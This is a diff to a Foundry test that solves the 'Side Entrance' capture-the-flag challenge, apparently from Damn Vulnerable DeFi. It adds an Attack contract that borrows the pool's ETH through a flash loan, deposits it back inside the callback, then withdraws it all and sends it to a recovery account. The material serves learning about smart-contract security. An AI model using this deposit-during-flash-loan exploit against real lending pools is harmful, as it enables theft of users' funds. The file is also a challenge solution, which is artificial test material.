@@ -45,7 +45,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        //Since deposit doesn't  transfer any ETH, use execute to deposit all the ETH.
+        Attack attacker = new Attack(pool, recovery);
+        attacker.attack();
     }
 
     /**
@@ -55,4 +57,30 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract Attack is IFlashLoanEtherReceiver {
+
+    SideEntranceLenderPool pool;
+    address recovery;
+    constructor(SideEntranceLenderPool _pool, address _recovery){
+        pool = _pool;
+        recovery = _recovery;
+    }
+    function execute() external payable{
+        pool.deposit{value: msg.value}();
+    }
+
+    function attack() external{
+        pool.flashLoan(1000e18);
+        pool.withdraw();
+        (bool success,) = recovery.call{value: 1000e18}("");
+        require(success, "Tx failed");
+    }
+
+    receive() external payable {}
 }
